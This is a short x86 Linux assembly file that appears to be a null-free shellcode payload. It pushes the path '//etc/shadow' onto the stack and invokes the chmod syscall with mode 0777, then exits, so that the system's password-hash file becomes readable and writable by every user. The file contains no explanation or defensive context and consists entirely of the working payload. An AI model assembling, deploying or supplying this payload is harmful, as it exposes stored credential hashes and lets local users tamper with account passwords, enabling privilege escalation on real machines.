global _start

section .text

_start:

	xor eax,eax
	push eax

	; chmod syscall() - 15
	mov al,0xf

	push dword 0x776f6461
	;push dword 0x6f6f6461
	push dword 0x68732f63
	push dword 0x74652f2f

	
	; chmod arguments
	mov ebx,esp
	xor ecx,ecx

	; print(oct(0x1ff)) == '0777'
	mov cx,0x1ff
	int 0x80

	; exit()
	inc eax
	int 0x80
